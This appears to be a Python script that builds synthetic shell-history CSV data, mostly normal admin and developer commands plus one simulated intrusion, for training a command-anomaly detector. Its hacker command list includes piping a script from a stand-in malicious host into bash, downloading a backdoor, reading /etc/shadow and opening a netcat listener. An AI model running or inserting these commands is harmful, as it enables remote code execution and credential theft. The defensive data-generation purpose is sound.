#!/usr/bin/env python3
"""
command-watcher-ai Phase 1용 합성 데이터 생성기
- 정확한 컬럼 구조: id,user_name,command,timestamp,current_dir,client_ip,server_ip,exit_code,session_id
- 해커 1명 침입 시나리오 포함
"""

import pandas as pd
from datetime import datetime, timedelta
import random
import uuid
from typing import List, Dict

# ----------------------------- 설정 -----------------------------
NUM_ROWS = 20000                     # ← 원하는 숫자 (10k~50k OK)
DAYS_BACK = 14
OUTPUT_CSV = "command_history_with_hacker.csv"
SERVER_IP = "10.0.0.1"               # 서버 IP (고정)

# 역할별 사용자
USERS_BY_ROLE = {
    "sysadmin": ["admin"],
    "webdev": [f"dev{i}" for i in range(1, 6)],
    "dba": [f"dba{i}" for i in range(1, 3)],
    "appmgr": [f"appmgr{i}" for i in range(1, 4)],
    "hacker": ["hacker"]
}

# 역할별 정상 명령어 풀
ROLE_COMMANDS = {
    "sysadmin": ["uptime", "free -h", "df -h", "top -c -o %CPU", "journalctl -u nginx --since '1 hour ago'", "systemctl restart nginx"],
    "webdev": ["ls -la", "git pull origin main", "git status", "npm install", "npm run build", "docker ps", "docker logs -f app --tail 50"],
    "dba": ["mysql -u root -p -e 'SHOW PROCESSLIST'", "mysql -u root -p -e 'SHOW DATABASES'", "mysqldump --all-databases > backup.sql"],
    "appmgr": ["kubectl get pods -n production", "kubectl logs deployment/api -f", "helm list -n production"]
}

# 해커 침투 명령어
HACKER_COMMANDS = [
    "whoami", "uname -a", "cat /etc/passwd", "cat /etc/shadow", "sudo -l",
    "curl -s http://malicious.com/install.sh | bash", "wget http://evil.com/backdoor.tar.gz -O /tmp/bd.tar.gz",
    "tar -xzf /tmp/bd.tar.gz -C /tmp", "chmod +x /tmp/backdoor", "./tmp/backdoor -h 185.220.101.XX",
    "nc -lvp 4444", "ssh -o StrictHostKeyChecking=no root@185.220.101.XX"
]

# ----------------------------- 생성 함수 -----------------------------
def generate_data(target_rows: int = 20000) -> pd.DataFrame:
    data = []
    base_time = datetime.now() - timedelta(days=DAYS_BACK)
    
    normal_users = [u for role, users in USERS_BY_ROLE.items() if role != "hacker" for u in users]
    avg_cmds_per_session = 8
    sessions_per_user = max(5, (target_rows * 95 // 100) // (len(normal_users) * avg_cmds_per_session))
    
    # 정상 사용자 데이터
    for role, users in USERS_BY_ROLE.items():
        if role == "hacker":
            continue
        for username in users:
            session_id = str(uuid.uuid4())[:8]
            client_ip = f"192.168.{random.randint(10, 99)}.{random.randint(1, 254)}"
            current_dir = f"/home/{username}" if role != "dba" else "/var/lib/mysql"
            
            for _ in range(sessions_per_user):
                current_time = base_time + timedelta(minutes=random.randint(0, DAYS_BACK*24*60))
                num_cmds = random.randint(4, 12)
                for _ in range(num_cmds):
                    command = random.choice(ROLE_COMMANDS[role])
                    data.append({
                        "user_name": username,
                        "command": command,
                        "timestamp": current_time,
                        "current_dir": current_dir,
                        "client_ip": client_ip,
                        "server_ip": SERVER_IP,
                        "exit_code": 0,
                        "session_id": session_id
                    })
                    current_time += timedelta(seconds=random.randint(5, 120))
    
    # 해커 데이터 (최근 2시간)
    hacker_session_id = "hacked-" + str(uuid.uuid4())[:6]
    hacker_client_ip = "185.220.101.45"
    hacker_current_dir = "/tmp"
    hacker_time = datetime.now() - timedelta(hours=2)
    
    for cmd in HACKER_COMMANDS:
        data.append({
            "user_name": "hacker",
            "command": cmd,
            "timestamp": hacker_time,
            "current_dir": hacker_current_dir,
            "client_ip": hacker_client_ip,
            "server_ip": SERVER_IP,
            "exit_code": 0 if any(x in cmd for x in ["whoami", "uname", "cat"]) else 1,
            "session_id": hacker_session_id
        })
        hacker_time += timedelta(seconds=random.randint(8, 45))
    
    df = pd.DataFrame(data)
    df = df.sort_values("timestamp").reset_index(drop=True)
    return df

# ----------------------------- 실행 -----------------------------
if __name__ == "__main__":
    print(f"🚀 {NUM_ROWS:,}건 데이터 생성 시작 (새 컬럼 구조 적용)...")
    df = generate_data(target_rows=NUM_ROWS)
    df.to_csv(OUTPUT_CSV, index=False)   # id는 MySQL에서 자동 생성
    
    print(f"✅ 완료! {len(df):,} rows → {OUTPUT_CSV}")
    print(f"   컬럼: {list(df.columns)}")
    print(f"   해커 행 수: {len(df[df['user_name']=='hacker'])}")
    print("\n이제 ingest_command_history.py 실행하세요!")